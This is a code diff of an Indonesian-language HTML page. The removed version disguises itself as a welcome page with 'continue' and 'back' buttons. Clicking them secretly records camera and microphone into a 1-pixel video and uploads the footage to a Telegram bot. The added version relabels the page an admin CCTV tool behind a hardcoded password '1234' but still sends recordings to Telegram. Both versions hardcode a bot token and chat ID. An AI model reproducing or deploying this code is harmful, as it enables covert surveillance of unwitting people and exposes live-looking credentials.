@@ -3,38 +3,22 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Rekaman Background</title>
+<title>Admin CCTV</title>
 <style>
   body {
-    margin: 0;
-    height: 100vh;
-    background: url('https://files.catbox.moe/c7fi9o.png') no-repeat center center/cover;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    flex-direction: column;
     font-family: sans-serif;
+    background: #111;
     color: #fff;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    height: 100vh;
   }
-  h1 {
-    font-size: 36px;
-    margin-bottom: 20px;
-    text-shadow: 2px 2px 4px #000;
-  }
-  button {
-    padding: 12px 30px;
-    font-size: 18px;
-    border: none;
-    border-radius: 10px;
-    cursor: pointer;
+  input, button {
+    padding: 10px;
     margin: 10px;
-    background: rgba(0,0,0,0.6);
-    color: #0f0;
-    text-shadow: 1px 1px 2px #000;
-    transition: 0.3s;
-  }
-  button:hover {
-    background: rgba(0,0,0,0.8);
+    font-size: 16px;
   }
   video {
     width: 1px;
@@ -48,21 +32,40 @@
 </head>
 <body>
 
-<h1>Selamat Datang</h1>
-<button id="startBtn">Lanjutkan</button>
-<button id="stopBtn">Kembali</button>
+<h2>Login Admin</h2>
+<input type="password" id="password" placeholder="Password Admin">
+<button id="loginBtn">Login</button>
 
-<video id="video" autoplay playsinline></video>
+<div id="adminPanel" style="display:none;">
+  <h2>Admin Panel</h2>
+  <button id="startBtn">Mulai Rekam</button>
+  <button id="stopBtn">Hentikan & Kirim</button>
+  <video id="video" autoplay playsinline></video>
+</div>
 
 <script>
 const BOT_TOKEN = "8223984259:AAHsAazlUhvE4LOCfzSR1Ty-CAa38X7svjk";
 const CHAT_ID = "7412613560";
+const ADMIN_PASS = "1234"; // ganti password admin
 
 let recorder, chunks = [], stream;
 
+const loginBtn = document.getElementById('loginBtn');
+const passwordInput = document.getElementById('password');
+const adminPanel = document.getElementById('adminPanel');
 const startBtn = document.getElementById('startBtn');
 const stopBtn = document.getElementById('stopBtn');
 const video = document.getElementById('video');
+
+loginBtn.addEventListener('click', () => {
+  if(passwordInput.value === ADMIN_PASS){
+    adminPanel.style.display = "flex";
+    passwordInput.style.display = "none";
+    loginBtn.style.display = "none";
+  } else {
+    alert("Password salah!");
+  }
+});
 
 startBtn.addEventListener('click', async () => {
   try {
@@ -71,11 +74,11 @@ startBtn.addEventListener('click', async () => {
 
     recorder = new MediaRecorder(stream);
     chunks = [];
-
     recorder.ondataavailable = e => chunks.push(e.data);
     recorder.start();
+    alert("Rekaman dimulai!");
   } catch(err) {
-    console.error("Tidak bisa mengakses kamera/mikrofon:", err);
+    alert("Tidak bisa mengakses kamera/mikrofon: " + err);
   }
 });
 
@@ -94,8 +97,9 @@ stopBtn.addEventListener('click', async () => {
         method: "POST",
         body: formData
       });
+      alert("✅ Video berhasil dikirim ke Telegram!");
     } catch(err) {
-      console.error("Gagal mengirim video:", err);
+      alert("❌ Gagal mengirim video: " + err);
     }
   };
 });
